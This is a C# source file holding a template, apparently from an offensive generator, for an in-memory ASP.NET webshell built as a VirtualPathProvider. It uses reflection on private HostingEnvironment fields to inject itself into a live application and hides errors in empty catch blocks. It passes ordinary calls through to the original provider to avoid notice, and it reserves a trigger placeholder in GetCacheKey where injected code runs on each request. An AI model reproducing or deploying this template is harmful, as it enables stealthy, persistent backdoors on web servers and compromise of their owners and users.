namespace NMG.Templates;

public static class VppTemplate
{
    public const string Source = """
        using System;
        using System.Collections;
        using System.Reflection;
        using System.Runtime.Remoting;
        using System.Text;
        using System.Web.Caching;
        using System.Web.Hosting;
        using System.Web;

        namespace {{NAMESPACE}}
        {
            public class {{CLASSNAME}} : VirtualPathProvider
            {
        {{MEMBERS}}

                static {{CLASSNAME}}()
                {
                    try
                    {
                        {{CLASSNAME}} vpp = new {{CLASSNAME}}();

                        bool registered = false;

                        // Method 1: Official registration (works during app init only)
                        try
                        {
                            MethodInfo registerMethod = typeof(HostingEnvironment).GetMethod(
                                "RegisterVirtualPathProviderInternal",
                                BindingFlags.NonPublic | BindingFlags.Instance | BindingFlags.Static | BindingFlags.InvokeMethod);
                            if (registerMethod != null)
                            {
                                registerMethod.Invoke(null, new object[] { vpp });
                                registered = true;
                            }
                        }
                        catch (Exception)
                        {
                        }

                        // Method 2: Directly replace internal field + manually set Previous chain
                        if (!registered)
                        {
                            FieldInfo vppField = typeof(HostingEnvironment).GetField(
                                "_virtualPathProvider",
                                BindingFlags.NonPublic | BindingFlags.Instance | BindingFlags.Static);
                            if (vppField != null)
                            {
                                FieldInfo envField = typeof(HostingEnvironment).GetField(
                                    "_theHostingEnvironment",
                                    BindingFlags.NonPublic | BindingFlags.Static);
                                if (envField != null)
                                {
                                    object hostingEnv = envField.GetValue(null);
                                    if (hostingEnv != null)
                                    {
                                        // Save old VPP as Previous
                                        object oldVpp = vppField.GetValue(hostingEnv);
                                        if (oldVpp != null && !object.ReferenceEquals(oldVpp, vpp))
                                        {
                                            FieldInfo prevField = typeof(VirtualPathProvider).GetField(
                                                "_previousProvider",
                                                BindingFlags.NonPublic | BindingFlags.Instance);
                                            if (prevField != null)
                                            {
                                                prevField.SetValue(vpp, oldVpp);
                                            }
                                        }

                                        // Replace the field
                                        vppField.SetValue(hostingEnv, vpp);
                                        registered = true;
                                    }
                                }
                            }
                        }

                        if (registered)
                        {
                            vpp.InitializeLifetimeService();
                            load = true;
                        }
                    }
                    catch (Exception)
                    {
                    }
                }

                public {{CLASSNAME}}()
                {
                }

                public override string CombineVirtualPaths(string basePath, string relativePath)
                {
                    return Previous.CombineVirtualPaths(basePath, relativePath);
                }

                public override ObjRef CreateObjRef(Type requestedType)
                {
                    return Previous.CreateObjRef(requestedType);
                }

                public override bool DirectoryExists(string virtualDir)
                {
                    return Previous.DirectoryExists(virtualDir);
                }

                public override bool Equals(object obj)
                {
                    return Previous.Equals(obj);
                }

                public override bool FileExists(string virtualPath)
                {
                    return Previous.FileExists(virtualPath);
                }

                public override CacheDependency GetCacheDependency(string virtualPath, IEnumerable virtualPathDependencies, DateTime utcStart)
                {
                    return Previous.GetCacheDependency(virtualPath, virtualPathDependencies, utcStart);
                }

        {{RANDOM_STRING}}

                public override string GetCacheKey(string virtualPath)
                {
                    try
                    {
                        HttpContext.Current.Application.Contents.Count.ToString();
                {{TRIGGER_BLOCK}}
                    }
                    catch (Exception)
                    {
                    }
                    return Previous.GetCacheKey(virtualPath);
                }
            }
        }
        """;
}
